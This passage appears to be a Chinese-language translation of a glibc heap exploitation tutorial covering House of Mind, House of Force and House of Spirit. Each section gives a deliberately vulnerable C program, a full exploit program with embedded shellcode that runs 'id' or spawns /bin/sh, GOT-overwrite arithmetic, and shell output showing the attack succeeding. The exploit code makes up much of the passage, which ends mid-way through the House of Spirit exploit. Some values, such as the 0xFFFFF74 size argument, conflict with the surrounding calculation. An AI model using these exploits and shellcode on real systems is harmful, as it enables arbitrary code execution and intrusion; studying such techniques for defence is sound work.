*\/\n}\n```\n\n\u4e0a\u8ff0\u7a0b\u5e8f\u7684\u5806\u5185\u5b58\u5e03\u5c40\uff1a\n\n![malloc-maleficarum-heap-layout-before-attack](..\/media\/pic\/heap\/malloc-maleficarum-heap-layout-before-attack.png)\n\n\u6807\u53f7 3 \u662f\u53d1\u751f\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u3002\n\n\u7528\u6237\u8f93\u5165\u88ab\u4f1a\u88ab\u5b58\u50a8\u5230 chunk1 \u7684\u5185\u5b58\u6307\u9488 \u5927\u5c0f\u4e3a 1M \u7684\u5185\u5b58\u3002\n\n\u56e0\u6b64\u4e3a\u4e86\u6210\u529f\u5229\u7528\u5806\u6ea2\u51fa\uff0c\u653b\u51fb\u8005\u63d0\u9ad8\u5982\u4e0b\u7684\u7528\u6237\u8f93\u5165(\u533a\u5206\u5e8f\u5217):\n\n* \u5047 arean\n* \u586b\u5145\n* \u5047 heap_info\n* shellcode\n\nexp \u7a0b\u5e8f,\u8fd9\u4e2a\u7a0b\u5e8f\u751f\u6210\u653b\u51fb\u8005\u7684\u8f93\u5165\u6570\u636e:\n\n```c\n\/* exp.c\nProgram to generate attacker data.\nCommand:\n     #.\/exp > file\n*\/\n#include <stdio.h>\n\n#define BIN1 0xb7fd8430\n\nchar scode[] =\n\/* Shellcode to execute linux command \"id\". Size - 72 bytes. *\/\n\"\\x31\\xc9\\x83\\xe9\\xf4\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x5e\"\n\"\\xc9\\x6a\\x42\\x83\\xeb\\xfc\\xe2\\xf4\\x34\\xc2\\x32\\xdb\\x0c\\xaf\\x02\\x6f\"\n\"\\x3d\\x40\\x8d\\x2a\\x71\\xba\\x02\\x42\\x36\\xe6\\x08\\x2b\\x30\\x40\\x89\\x10\"\n\"\\xb6\\xc5\\x6a\\x42\\x5e\\xe6\\x1f\\x31\\x2c\\xe6\\x08\\x2b\\x30\\xe6\\x03\\x26\"\n\"\\x5e\\x9e\\x39\\xcb\\xbf\\x04\\xea\\x42\";\n\nchar ret_str[4] = \"\\x00\\x00\\x00\\x00\";\n\nvoid convert_endianess(int arg)\n{\n        int i=0;\n        ret_str[3] = (arg & 0xFF000000) >> 24;\n        ret_str[2] = (arg & 0x00FF0000) >> 16;\n        ret_str[1] = (arg & 0x0000FF00) >> 8;\n        ret_str[0] = (arg & 0x000000FF) >> 0;\n}\nint main() {\n        int i=0,j=0;\n\n        fwrite(\"\\x41\\x41\\x41\\x41\", 4, 1, stdout); \/* fd *\/\n        fwrite(\"\\x41\\x41\\x41\\x41\", 4, 1, stdout); \/* bk *\/\n        fwrite(\"\\x41\\x41\\x41\\x41\", 4, 1, stdout); \/* fd_nextsize *\/\n        fwrite(\"\\x41\\x41\\x41\\x41\", 4, 1, stdout); \/* bk_nextsize *\/\n        \/* Fake Arena. *\/\n        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* mutex *\/\n        fwrite(\"\\x01\\x00\\x00\\x00\", 4, 1, stdout); \/* flag *\/\n        for(i=0;i<10;i++)\n                fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* fastbinsY *\/\n        fwrite(\"\\xb0\\x0e\\x10\\x08\", 4, 1, stdout); \/* top *\/\n        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* last_remainder *\/\n        for(i=0;i<127;i++) {\n                convert_endianess(BIN1+(i*8));\n                if(i == 119) {\n                        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* preserve prev_size *\/\n                        fwrite(\"\\x09\\x04\\x00\\x00\", 4, 1, stdout); \/* preserve size *\/\n                } else if(i==0) {\n                        fwrite(\"\\xe8\\x98\\x04\\x08\", 4, 1, stdout); \/* bins[i][0] = (GOT(free) - 12) *\/\n                        fwrite(ret_str, 4, 1, stdout); \/* bins[i][1] *\/\n                }\n                else {\n                        fwrite(ret_str, 4, 1, stdout); \/* bins[i][0] *\/\n                        fwrite(ret_str, 4, 1, stdout); \/* bins[i][1] *\/\n                }\n        }\n        for(i=0;i<4;i++) {\n                fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* binmap[i] *\/\n        }\n        fwrite(\"\\x00\\x84\\xfd\\xb7\", 4, 1, stdout); \/* next *\/\n        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* next_free *\/\n        fwrite(\"\\x00\\x60\\x0c\\x00\", 4, 1, stdout); \/* system_mem *\/\n        fwrite(\"\\x00\\x60\\x0c\\x00\", 4, 1, stdout); \/* max_system_mem *\/\n        for(i=0;i<234;i++) {\n                fwrite(\"\\x41\\x41\\x41\\x41\", 4, 1, stdout); \/* PAD *\/\n        }\n        for(i=0;i<722;i++) {\n                if(i==721) {\n                        \/* Chunk 724 contains the shellcode. *\/\n                        fwrite(\"\\xeb\\x18\\x00\\x00\", 4, 1, stdout); \/* prev_size  - Jmp 24 bytes *\/\n                        fwrite(\"\\x0d\\x04\\x00\\x00\", 4, 1, stdout); \/* size *\/\n                        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* fd *\/\n                        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* bk *\/\n                        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* fd_nextsize *\/\n                        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* bk_nextsize *\/\n                        fwrite(\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \\\n                        \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\", 16, 1, stdout);  \/* NOPS *\/\n                        fwrite(scode, sizeof(scode)-1, 1, stdout); \/* SHELLCODE *\/\n                        for(j=0;j<230;j++)\n                                fwrite(\"\\x42\\x42\\x42\\x42\", 4, 1, stdout); \/* PAD *\/\n                        continue;\n                } else {\n                        fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, stdout); \/* prev_size *\/\n                        fwrite(\"\\x09\\x04\\x00\\x00\", 4, 1, stdout); \/* size *\/\n                }\n                if(i==720) {\n                        for(j=0;j<90;j++)\n                                fwrite(\"\\x42\\x42\\x42\\x42\", 4, 1, stdout); \/* PAD *\/\n                        fwrite(\"\\x18\\xa0\\x04\\x08\", 4, 1, stdout); \/* Arena Pointer *\/\n                        for(j=0;j<165;j++)\n                                fwrite(\"\\x42\\x42\\x42\\x42\", 4, 1, stdout); \/* PAD *\/\n                } else {\n                        for(j=0;j<256;j++)\n                                fwrite(\"\\x42\\x42\\x42\\x42\", 4, 1, stdout); \/* PAD *\/\n                }\n        }\n        return 0;\n}\n```\n\n\u4f7f\u7528\u6784\u9020\u7684\u6570\u636e\u8f93\u5165\u540e\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u5806\u7a7a\u95f4\uff1a\n\n![malloc-maleficarum-heap-layout-after-attack](..\/media\/pic\/heap\/malloc-maleficarum-heap-layout-after-attack.png)\n\n\u968f\u7740\u653b\u51fb\u8005\u751f\u6210\u7684\u6570\u636e\u88ab\u8f93\u5165\uff0c\u5f53\u6807\u53f7 4 \u88ab\u6267\u884c\u65f6 glibc malloc \u505a\u4e86\u5982\u4e0b\u7684\uff1a\n\n* \u901a\u8fc7\u8c03\u7528 arena_for_chunk \u5b8f\u6765\u6062\u590d\u6b63\u5728\u91ca\u653e\u7684 chunk \u7684 arena\u3002\n\n1. `arena_for_chunk`\uff1a \u5982\u679c NON_MAIN_ARENA (N) bit \u6ca1\u6709\u88ab\u7f6e\u4f4d\uff0c\u4f1a\u8fd4\u56de main arena\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\uff0c\u5219\u901a\u8fc7\u5c06\u5757\u5730\u5740\u4e0e HEAP_MAX_SIZE \u7684\u500d\u6570\u5bf9\u9f50\u6765\u8bbf\u95ee\u5bf9\u5e94\u7684 heap_info \u7ed3\u6784\u3002\n\n\u7136\u540e\u8fd4\u56de\u83b7\u5f97\u7684 heap_info \u7ed3\u6784\u4f53\u7684 arena \u6307\u9488\u3002\n\n\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u91cc\u9762\uff0cNON_MIAN_ARENA \u4f4d\u88ab\u653b\u51fb\u8005\u8bbe\u7f6e\uff0c\u56e0\u6b64\u83b7\u5f97\u88ab\u91ca\u653e\u7684 chunk \u7684 heap_info \u7ed3\u6784\u4f53\u3002\n\n\u653b\u51fb\u8005\u4e5f\u5c06\u4ee5\u8fd9\u6837\u7684\u65b9\u5f0f\u8986\u5199\uff08\u83b7\u5f97\u7684 heap_info \u7ed3\u6784\u7684\uff09arena \u6307\u9488\uff0c\u5373\u5b83\u6307\u5411 fake arena\uff0c\u5373 heap_info \u7684 ar_ptr = fake arena \u7684\u57fa\u5730\u5740\uff08\u5373 0x0804a018\uff09\u3002\n\n\u4f7f\u7528 arena \u6307\u9488\u548c chunk \u5730\u5740\u4f5c\u4e3a\u53c2\u6570\u8c03\u7528_int_free. \u5728\u4f8b\u5b50\u4e2d\uff0carena \u6307\u9488\u6307\u5411\u4f2a\u9020\u7684 arena,\u56e0\u6b64\u5047 arena \u548c chunk \u5730\u5740\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9_int_free\u3002\n\n\u5047 arena \u7684\u6784\u9020\uff1a\u4ee5\u4e0b\u662f\u9700\u8981\u88ab\u653b\u51fb\u8005\u8986\u5199\u7684\u5047 arena \u7684\u5fc5\u586b\u5b57\u6bb5\uff1a\n\nmutex - \u5e94\u8be5\u662f\u65e0\u9501\u72b6\u6001\nbins - unsorted bin \u7684 fd \u5e94\u8be5\u5305\u542b free - 12 \u7684 got \u7684\u5730\u5740 \n\n\u9876\u90e8\u5730\u5740\u4e0d\u5e94\u8be5\u7b49\u4e8e\u88ab free \u7684 chunk \u5730\u5740\u3002\n\n\u9876\u90e8\u5730\u5740\u5e94\u8be5\u5927\u4e8e next chunk \u7684\u5730\u5740\u3002\n\n\u7cfb\u7edf\u5185\u5b58 - \u5185\u5b58\u5e94\u8be5\u5927\u4e8e next chunk \u7684 size\u3002\n\n> _int_free():\n\n* \u5982\u679c chunk \u6ca1\u6709\u6620\u5c04\uff0c\u5219\u83b7\u5f97\u9501\uff0c\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u91cc\u9762 chunk \u6ca1\u6709\u88ab\u6620\u5c04\u6240\u4ee5\u5047\u7684 arena \u4e92\u65a5\u9501\u83b7\u53d6\u6210\u529f\u3002\n\n1. \u5408\u5e76:\n\n\u5982\u679c\u53d1\u73b0\u524d\u9762\u7684 chunk \u662f free \u7684\uff0c\u5219\u50cf\u540e\u5408\u5e76;\u540e\u9762\u7684 chunk \u662f free \u7684\uff0c\u5219\u5411\u524d\u5408\u5e76\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\u524d\u9762\u7684 chunk \u662f\u88ab\u5206\u914d\u7684\u51fa\u53bb\u7684\uff0c\u6240\u4ee5\u4e0d\u80fd\u88ab\u5411\u540e\u5408\u5e76\uff1b\u540e\u9762\u7684 chunk \u72b6\u6001\u4e5f\u662f allocated \u56e0\u6b64\u4e0d\u80fd\u88ab\u5411\u524d\u5408\u5e76\u3002\n\n* \u5f53\u524d\u7684 free chunk \u5728 unsorted bin.\n\n\u5728\u6211\u4eec\u7684\u6848\u4f8b\u4e2d\uff0cfake arena \u7684 unsorted bin \u7684 fd \u5305\u542b free \u7684 GOT \u7684\u5730\u5740 - 12\uff0c\u5b83\u88ab\u590d\u5236\u5230'fwd'\u3002\n\n\u4e4b\u540e\uff0c\u5f53\u524d\u88ab\u91ca\u653e\u7684 chunk \u7684\u5730\u5740\u88ab\u590d\u5236\u5230`fwd->bk`.\n\nbk \u662f\u4f4d\u4e8e malloc_chunk \u504f\u79fb 12 \u7684\u5730\u65b9\uff0c\u56e0\u6b64 12 \u88ab\u52a0\u5230\u8fd9\u4e2a fwd \u7684\u503c\u4e0a\u4e5f\u5c31\u662f\u8bf4 free-12+12\n\n\u56e0\u6b64\u73b0\u5728 free \u7684 got \u5165\u53e3\u5730\u5740\u88ab\u4fee\u6539\u6210\u5305\u542b\u5f53\u524d\u7684 free \u72b6\u6001\u7684 chunk \u7684\u5730\u5740\u3002\n\n\u81ea\u653b\u51fb\u8005\u653e\u7f6e\u4ed6\u7684 shellcode \u5728\u5f53\u524d free \u72b6\u6001\u7684 chunk\uff0c\u7136\u540e\u4e0d\u4e45 free \u88ab\u8c03\u7528\u65f6\u5019\u653b\u51fb\u8005\u7684 shellcode \u88ab\u6267\u884c\u3002\n\n\u653b\u51fb\u8005\u4ee5\u6784\u9020\u7684\u6570\u636e\u505a\u8f93\u5165\u6267\u884c\u5b58\u5728\u7684\u6f0f\u6d1e\u7684\u7a0b\u5e8f shellcode \u88ab\u6267\u884c\u5982\u4e0b\uff1a\n\n```shell\nSn0rt@warzone:~$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=~\/workspace\/glibc\/glibc-inst2.20\/lib -Wl,--dynamic-linker=~\/workspace\/glibc\/glibc-inst2.20\/lib\/ld-linux.so.2\nSn0rt@warzone:~$ gcc -g -o exp exp.c\nSn0rt@warzone:~$ .\/exp > file\nSn0rt@warzone:~$ .\/vuln < file\nptr found at 0x804a008\ngood heap allignment found on malloc() 724 (0x81002a0)\nuid=1000(sploitfun) gid=1000(sploitfun) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)\n```\n\n\u4fdd\u62a4\uff1a \u5982\u4eca\uff0chouse of mind \u6280\u672f\u81ea`glibc malloc` GOT \u52a0\u56fa\u540e\u800c\u5931\u6548\u3002\n\n\u4e0b\u9762\u662f glibc \u4e3a\u4fdd\u62a4 house-of-mind \u5229\u7528\u5806\u6ea2\u51fa\u589e\u52a0\u7684\u68c0\u67e5\uff1a\n\n\u88ab\u7834\u574f\u7684 chunk\uff1a\u5982\u679c`glibc malloc`\u6ca1\u6709\u629b\u51fa chunk \u88ab\u7834\u574f\u8fd9\u6837\u7684\u9519\u8bef\uff0c\u90a3\u4e48 unsotred bin \u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk \u6307\u9488\u5e94\u8be5\u6307\u5411 unsorted bin.\n\n```c\n      if (__glibc_unlikely (fwd->bk != bck))\n        {\n          errstr = \"free(): corrupted unsorted chunks\";\n          goto errout;\n        }\n```\n\n# House of Force\n\n\u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u653b\u51fb\u8005\u6ee5\u7528 top chunk size \u6765\u620f\u5f04 'glibc malloc' \u4f7f\u7528 top chunk \u5904\u7406\u975e\u5e38\u5927\u7684\u5185\u5b58\u8bf7\u6c42(\u5927\u4e8e\u5806\u7cfb\u7edf\u5185\u5b58\u5927\u5c0f)\u3002\n\n\u73b0\u5728\u5f53\u4e00\u4e2a\u65b0\u7684 malloc \u8bf7\u6c42\u53c2\u6570\uff0cfree \u7684 GOT \u6761\u76ee\u5c06\u88ab\u8986\u5199\u4e3a shellcode \u5730\u5740\u3002\n\n\u56e0\u6b64\u81ea\u73b0\u5728\u8d77\u65e0\u8bba\u4f55\u65f6 free() \u88ab\u8c03\u7528\uff0cshellcode \u5c06\u4f1a\u88ab\u6267\u884c\u3002\n\n\u5148\u51b3\u6761\u4ef6\uff1a\u6210\u529f\u5e94\u7528 house of force \u9700\u8981\u4e09\u4e2a malloc \u8c03\u7528\u5982\u4e0b\uff1a\n\n* Malloc 1: \u653b\u51fb\u8005\u5e94\u8be5\u53ef\u4ee5\u63a7\u5236 top chunk \u7684 size\uff0c\u56e0\u6b64\uff0c\u5806\u6ea2\u51fa\u5e94\u8be5\u53ef\u80fd\u5728\u7269\u7406\u4e0a\u4f4d\u4e8e top chunk \u4e4b\u524d\u7684\u8fd9\u4e2a\u5206\u914d\u7684\u5757\u4e0a\u3002\n* Malloc 2: \u653b\u51fb\u8005\u5e94\u8be5\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a malloc \u8bf7\u6c42\u7684\u5927\u5c0f\u3002\n* Malloc 3: \u7528\u6237\u8f93\u5165\u5e94\u590d\u5236\u5230\u8fd9\u4e2a\u5206\u914d\u7684 chunk\u3002\n\n\u6f0f\u6d1e\u7a0b\u5e8f: \u6b64\u7a0b\u5e8f\u6ee1\u8db3\u4e0a\u8ff0\u5148\u51b3\u6761\u4ef6.\n\n```c\n\/*\nHouse of force vulnerable program. \n*\/\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h> \n\nint main(int argc, char *argv[])\n{\n        char *buf1, *buf2, *buf3;\n        if (argc != 4) {\n                printf(\"Usage Error\\n\");\n                return;\n        }\n        [1]buf1 = malloc(256);\n        [2]strcpy(buf1, argv[1]); \/* Prereq 1 *\/\n        [3]buf2 = malloc(strtoul(argv[2], NULL, 16)); \/* Prereq 2 *\/\n        [4]buf3 = malloc(256); \/* Prereq 3 *\/\n        [5]strcpy(buf3, argv[3]); \/* Prereq 3 *\/\n\n        [6]free(buf3);\n        free(buf2);\n        free(buf1);\n        return 0;\n}\n```\n\n\u4e0a\u8ff0\u6f0f\u6d1e\u7a0b\u5e8f\u7684 heap \u5185\u5b58\u56fe\u793a\uff1a\n\n![house-of-force-before-attack.png](..\/media\/pic\/heap\/house-of-force-before-attack.png)\n\n\u6f0f\u6d1e\u7a0b\u5e8f\u7684 line[2] \u65f6\u53d1\u751f\u5806\u6ea2\u51fa\u7684\u5730\u65b9\uff0c\u56e0\u6b64\u60f3\u8981\u6210\u529f\u5229\u7528\u5806\u6ea2\u51fa\uff0c\u653b\u51fb\u8005\u9700\u8981\u63d0\u4f9b\u5982\u4e0b\u540d\u5229\u884c\u53c2\u6570:\n\nargv[1] \u2013 shellcode + \u586b\u5145 + top chunk \u7684 size \u88ab\u590d\u5236\u5230\u9996\u4e2a malloc chunk\u3002\nargv[2] \u2013 size \u53c2\u6570\u5230\u7b2c\u4e8c\u4e2a malloc chunk\u3002\nargv[3] \u2013 \u7528\u6237\u8f93\u5165\u88ab\u590d\u5236\u5230\u7b2c\u4e09\u4e2a malloc chunk\u3002\n\n\n## exploit\n\n\u5229\u7528\u7a0b\u5e8f\uff1a\n\nexploit program:\n\n```c\n\/* Program to exploit executable 'vuln' using hof technique.\n *\/\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n\n#define VULNERABLE \".\/vuln\"\n#define FREE_ADDRESS 0x08049858-0x8\n#define MALLOC_SIZE \"0xFFFFF744\"\n#define BUF3_USER_INP \"\\x08\\xa0\\x04\\x08\"\n                \n\/* Spawn a shell. Size - 25 bytes. *\/\nchar scode[] =\n        \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n        \nint main( void )\n{       \n        int i;\n        char * p;\n        char argv1[ 265 ];\n        char * argv[] = { VULNERABLE, argv1, MALLOC_SIZE, BUF3_USER_INP, NULL };\n        \n        strcpy(argv1,scode);\n        for(i=25;i<260;i++)\n                argv1[i] = 'A';\n        \n        strcpy(argv1+260,\"\\xFF\\xFF\\xFF\\xFF\"); \/* Top chunk size *\/\n        argv[264] = ''; \/* Terminating NULL character *\/ \n\n        \/* Execution of the vulnerable program *\/\n        execve( argv[0], argv, NULL );\n        return( -1 );\n}\n```\n\n\u4e00\u65e6\u653b\u51fb\u8005\u7684\u547d\u4ee4\u884c\u53c2\u6570\u88ab\u590d\u5236\u5230\u5806\u4e2d\u540e\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u7684\u5806\u5185\u5b58\u5e03\u5c40\uff1a\n\n![house-of-force-before-attack](..\/media\/pic\/heap\/house-of-force-before-attack.png)\n\n\u4f34\u968f\u7740\u653b\u51fb\u8005\u53c2\u6570\u53d1\u751f\u5982\u4e0b\uff1a\n\n\u6807\u53f7 2 \u8986\u5199 top chunk \u7684 size:\n\n> \u653b\u51fb\u8005\u53c2\u6570(argv[1] - shellcode + pad + 0xFFFFFFFF)\u88ab\u590d\u5236\u5230 buf1 \u7684\u5806\uff0c\u4f46\u662f\u53c2\u6570 argv[1] \u5927\u4e8e 256\uff0c\u6240\u4ee5 top chunk \u7684 size \u4f1a\u88ab\u8986\u5199\u4e3a 0xFFFFFFFF\u3002\n\n\u6807\u53f7 3 \u4f7f\u7528 top chunk \u5206\u914d\u975e\u5e38\u5927\u7684\u5757\uff1a\n\n> \u975e\u5e38\u5927\u7684\u5757\u5206\u914d\u8bf7\u6c42\u7684\u76ee\u7684\u662f\u5728\u5206\u914d\u4e4b\u540e\u4f7f\u65b0\u7684 top chunk \u5e94\u8be5\u4f4d\u4e8e free \u7684 GOT \u6761\u76ee\u4e4b\u524d 8 \u4e2a\u5b57\u8282\u3002\n\n\u6240\u4ee5\u591a\u4e2a malloc \u7684\u8bf7\u6c42(\u6807\u53f7 4)\u5c06\u4f1a\u5e2e\u52a9\u6211\u4e48\u8986\u5199 free \u7684 got \u6761\u76ee\u3002\n\n\u653b\u51fb\u8005\u53c2\u6570\uff08argv [2] - 0xFFFFF744\uff09\u4f5c\u4e3a size \u53c2\u6570\u4f20\u9012\u7ed9\u7b2c\u4e8c\u4e2a malloc \u8c03\u7528\uff08\u6807\u53f7[3]\uff09\u3002\n\n\u8fd9\u4e2a size \u53c2\u6570\u901a\u8fc7\u4e0b\u9762\u516c\u5f0f\u8ba1\u7b97\u7684\uff1a\n\n size = ((free-8)-top)\n\n\u4f4d\u7f6e\n\n> free \u662f \"vlun \u4e2d free \u7684 GOT \u7684\u6761\u76ee\" \u4e5f\u5c31\u662f\u8bf4 free = 0x08049858.\n\n> top \u662f \"\u5f53\u524d\u7684 top chunk (\u6807\u53f7 1 \u540e\u7684\u7b2c\u4e00\u4e2a malloc)\"\u4e5f\u5c31\u662f\u8bf4 top = 0x0804a108.\n\n\u56e0\u6b64 size = ((0x8049858-0x8)-0x804a108) = -8B8 = 0xFFFFF748\n\n\u5f53  size = 0xFFFFF748 \u662f\u6211\u4eec\u653e\u7f6e\u65b0 top chunk free \u7684 GOT \u6761\u76ee\u4e4b\u524d\u7684 8 bytes \u7684\u5b9e\u73b0\u65b9\u5f0f\u5c55\u793a\u5982\u4e0b\uff1a\n\n> (0xFFFFF748+0x804a108) = 0x08049850 = (0x08049858-0x8)\n\n\u4f46\u662f\u5f53\u653b\u51fb\u8005\u901a\u8fc7\u4e00\u4e2a size \u53c2\u6570 0xFFFFF748\uff0cglibc malloc \u6362\u88c5\u8fd9 size \u53d8\u6210\u53ef\u7528\u7684 size 0xFFFFF750\uff0c\u6240\u4ee5\u73b0\u5728\u65b0\u7684 top chunk \u7684 size \u4f1a\u4f4d\u4e8e 0x8049858 \u800c\u4e0d\u662f 0x8049850.\n\n\u6240\u4ee5\u4f5c\u4e3a 0xFFFFF748 \u7684\u66ff\u4ee3\uff0c\u653b\u51fb\u8005\u5e94\u8be5\u901a\u8fc7 0xFFFFF74 \u4e3a size \u53c2\u6570\uff0c\u8fd9\u6837\u5b83\u4f1a\u88ab\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5982\u6211\u4eec\u6240\u9700\u8981\u5185\u90e8\u53ef\u7528\u7684 size 0xFFFFF748\u3002\n\n\u5728\u6807\u53f7 4:\n\n> \u73b0\u5728\u81ea\u6807\u53f7 [3] top chunk \u6307\u5411 0x8049850\uff0c\u4e00\u4e2a 256 \u5b57\u8282\u7684\u5185\u5b58\u5206\u914d\u7684\u8bf7\u6c42\u5c06\u4f1a\u4f7f glibc malloc \u8fd4\u56de 0x8049858 \u88ab\u590d\u5236\u5230 buf3.\n\n\u5728\u6807\u53f7[5]:\n\n> \u590d\u5236 buf1 \u7684\u5730\u5740\u5230 buf3\uff0c\u5bfc\u81f4 GOT \u88ab\u8986\u76d6\uff0c\u6240\u4ee5\u5728 line[6]\u6389\u7528 free \u4f1a\u5bfc\u81f4\u4efb\u610f shellcode \u6267\u884c\uff01\n\n\u7528\u653b\u51fb\u8005\u547d\u4ee4\u884c\u53c2\u6570\u6b63\u5728\u7684\u6267\u884c\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6267\u884c shellcode \u5982\u4e0b\u6240\u793a\uff1a\n\n```shell\nSn0rt@warzone:~$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=\/home\/sploitfun\/glibc\/glibc-inst2.20\/lib -Wl,--dynamic-linker=\/home\/sploitfun\/glibc\/glibc-inst2.20\/lib\/ld-linux.so.2\nSn0rt@warzone:~$ gcc -g -o exp exp.c\nSn0rt@warzone:~$ .\/exp \n$ ls\ncmd  exp  exp.c  vuln  vuln.c\n$ exit\n```\n\n\u4fdd\u62a4: \u76f4\u5230\u76ee\u524d\uff0c\u8fd8\u6ca1\u6709\u589e\u52a0\u8fd9\u4e2a\u6280\u672f\u7684\u4fdd\u62a4\u6280\u672f\uff0c\u4e5f\u5c31\u8bf4\u8fd9\u4e2a\u6280\u672f\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u6700\u65b0\u7248\u672c\u7684 glibc \u4e0a\u5229\u7528\u5806\u6ea2\u51fa\u3002\ud83d\ude42\n\n# House of Spirit\n\n\u8fd9\u4e2a\u6280\u672f\uff0c\u653b\u51fb\u8005\u620f\u5f04 glibc malloc \u8fd4\u56de\u7684 chunk \u7684\u5730\u5740\u4f4d\u4e8e stack \u6bb5\uff0c\u800c\u4e0d\u662f\u5806\u6bb5\u3002\u8fd9\u6837\u5c31\u5141\u8bb8\u653b\u51fb\u8005\u8986\u76d6\u5b58\u50a8\u5728\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740\u3002\n\n\u5148\u51b3\u6761\u4ef6\uff1a\u4e0d\u662f\u6240\u6709\u5806\u6ea2\u51fa\u90fd\u80fd\u9002\u7528 house of spirit,\u4e0b\u9762\u662f\u80fd\u6210\u529f\u5e94\u7528\u5b83\u7684\u5148\u51b3\u6761\u4ef6\u3002\n\n* \u4e00\u4e2a\u7f13\u51b2\u533a\u6ea2\u51fa\u8986\u76d6\u4e00\u4e2a\u5305\u542b malloc \u8fd4\u56de\u7684 chunk \u5730\u5740\u7684\u53d8\u91cf\u3002\n* \u4e0a\u8ff0 chunk \u5e94\u8be5\u662f free \u72b6\u6001\uff0c\u653b\u51fb\u8005\u5e94\u8be5\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a chunk \u7684 size \u5b57\u6bb5\uff0c\u5e76\u628a\u5b83\u6539\u6210\u7b49\u4e8e\u4e0b\u4e00\u4e2a\u5206\u914d\u7684 chunk \u7684 size \u503c\u3002\n* Malloc \u4e00\u4e2a chunk\u3002\n* \u7528\u6237\u8f93\u5165\u53ef\u4ee5\u88ab\u590d\u5236\u5230\u4e0a\u8ff0\u7684 malloc \u7684 chunk\u3002\n\n\u6f0f\u6d1e\u7a0b\u5e8f\uff1a\u8fd9\u4e2a\u7a0b\u5e8f\u770b\u4e0a\u53bb\u6ee1\u8db3\u4e0a\u8ff0\u9700\u6c42\u3002\n\n```c\n\/* vuln.c\nHouse of Spirit vulnerable program\n*\/\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid fvuln(char *str1, int age)\n{\n   char *ptr1, name[44];\n   int local_age;\n   char *ptr2;\n   [1]local_age = age; \/* Prereq 2 *\/\n\n   [2]ptr1 = (char *) malloc(256);\n   printf(\"\\nPTR1 = [ %p ]\", ptr1);\n   [3]strcpy(name, str1); \/* Prereq 1 *\/\n   printf(\"\\nPTR1 = [ %p ]\\n\", ptr1);\n   [4]free(ptr1); \/* Prereq 2 *\/\n\n   [5]ptr2 = (char *) malloc(40); \/* Prereq 3 *\/\n   [6]snprintf(ptr2, 40-1, \"%s is %d years old\", name, local_age); \/* Prereq 4 *\/\n   printf(\"\\n%s\\n\", ptr2);\n}\n\nint main(int argc, char *argv[])\n{\n   int i=0;\n   int stud_class[10];  \/* Required since nextchunk size should lie in between 8 and arena's system_mem. *\/\n   for(i=0;i<10;i++)\n        [7]stud_class[i] = 10;\n   if (argc == 3)\n      fvuln(argv[1], 25);\n   return 0;\n}\n```\n\u4e0a\u8ff0\u6f0f\u6d1e\u7a0b\u5e8f\u7684\u6808\u5e03\u5c40\n\n![house-of-spirit](..\/media\/pic\/heap\/house-of-spirit-before-attack.png)\n\n\u6f0f\u6d1e\u7a0b\u5e8f\u7684\u6807\u53f7[3]\u5904\u53d1\u751f\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u56e0\u6b64\u4e3a\u4e86\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u653b\u51fb\u8005\u9700\u8981\u7ed9\u51fa\u4ee5\u4e0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff1a\n\nargv[1] = Shell Code + Stack Address + Chunk size\n\nExp:\n\n```c\n\/* Program to exploit executable 'vuln' using hos technique.\n *\/\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n\n#define VULNERABLE \".\/vuln\"\n\n\/* Shellcode to spwan a shell. Size: 48 bytes - Includes Return Address overwrite *\/\nchar scode[] =\n        \"\\xeb\\x0e\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb8\\xfd\\xff\\xbf\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x90\\x90\\x90\\x90\\x90\\x90\\x90\";\n\nint main( void )\n{\n        int i;\n        char * p;\n        char argv1[54];\n        char * argv[] = { VULNERABLE, 